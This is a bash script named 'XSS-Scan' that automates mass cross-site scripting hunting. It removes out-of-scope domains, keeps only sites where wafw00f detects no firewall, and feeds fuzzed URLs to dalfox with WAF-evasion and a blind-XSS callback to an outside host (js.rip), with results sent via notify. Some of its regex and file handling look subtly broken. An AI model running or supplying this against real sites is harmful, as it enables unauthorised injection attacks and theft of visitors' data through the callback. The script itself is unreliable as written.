#!/bin/bash
#XSS-Scan

# Check if the correct number of arguments are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <outscope.txt> <urls.txt>"
    exit 1
fi

# Assign input file names to variables
outscope_file="$1"
urls_file="$2"

# Check if input files exist
if [ ! -f "$outscope_file" ]; then
    echo "Error: File $outscope_file not found."
    exit 1
fi

if [ ! -f "$urls_file" ]; then
    echo "Error: File $urls_file not found."
    exit 1
fi

# Extract domains from outscope.txt
outscope_domains=$(grep -oE '\b(?:https?://)?(?:www\.)?[-a-zA-Z0-9@:%._+~#=]{2,256}\.[a-z]{2,6}\b(?:[-a-zA-Z0-9@:%_\+.~#?&//=]*)?|\*\.[a-zA-Z0-9-]+(\.[a-zA-Z]{2,})?\b' "$outscope_file")

# Loop through each domain in outscope_domains
while IFS= read -r domain; do
    # Remove lines containing the domain from urls.txt
    sed -i "/$domain/d" "$urls_file"
done <<< "$outscope_domains"

echo "Out-of-scope domains removed from urls.txt."

# Extract domain names from urls.txt
domains=$(grep -oE '\b(?:https?://)?(?:www\.)?[-a-zA-Z0-9@:%._+~#=]{2,256}\.[a-z]{2,6}\b(?:[-a-zA-Z0-9@:%_\+.~#?&//=]*)?|\*\.[a-zA-Z0-9-]+(\.[a-zA-Z]{2,})?\b' "$urls_file")

# Loop through each domain in domains
while IFS= read -r domain; do
    # Run wafw00f on the domain
    waf_output=$(wafw00f "$domain")

    # Check if "No WAF detected by the generic detection" is not in the output
    if ! grep -q "No WAF detected by the generic detection" <<< "$waf_output"; then
        # Remove URLs with the domain name from urls.txt
        sed -i "/$domain/d" "$urls_file"
    fi
done <<< "$domains"

echo "WAF enabled domains removed from urls.txt."

# Split the urls.txt file into smaller files
split -l 300 urls.txt small_file

# Iterate over each smaller file
for file in small_file*; do
    # Execute your script for each file
    cat "$file" | qs FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://js.rip/n9c82cr5nj -o results.tmp && cat results.tmp | notify -silent -id Confidential-Exif1, Confidential-Exif2 | anew results.txt
done

# Cleanup: remove the smaller files
rm small_file*
